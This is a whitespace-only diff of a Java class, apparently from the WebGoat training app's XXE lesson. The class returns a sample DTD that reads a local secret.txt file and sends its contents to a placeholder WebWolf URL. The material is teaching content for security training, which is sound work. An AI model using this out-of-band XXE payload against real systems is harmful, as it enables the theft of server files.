@@ -115,11 +115,11 @@ public class SimpleXXE extends AssignmentEndpoint {
   @ResponseBody
   public String getSampleDTDFile() {
     return "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
-               + "<!ENTITY % file SYSTEM"
-               + " \"file:replace-this-by-webgoat-temp-directory/XXE/secret.txt\">\n"
-               + "<!ENTITY % all \"<!ENTITY send SYSTEM"
-               + " 'http://replace-this-by-webwolf-base-url/landing?text=%file;'>\">\n"
-               + "%all;";
+        + "<!ENTITY % file SYSTEM"
+        + " \"file:replace-this-by-webgoat-temp-directory/XXE/secret.txt\">\n"
+        + "<!ENTITY % all \"<!ENTITY send SYSTEM"
+        + " 'http://replace-this-by-webwolf-base-url/landing?text=%file;'>\">\n"
+        + "%all;";
   }
 
   @GetMapping(path = "/xxe/applysecurity", produces = MediaType.TEXT_PLAIN_VALUE)
@@ -131,6 +131,6 @@ public class SimpleXXE extends AssignmentEndpoint {
       request.getSession().setAttribute("applySecurity", "true");
     }
     return "xxe security patch is now applied, you can try the previous challenges and see the"
-               + " effect!";
+        + " effect!";
   }
 }
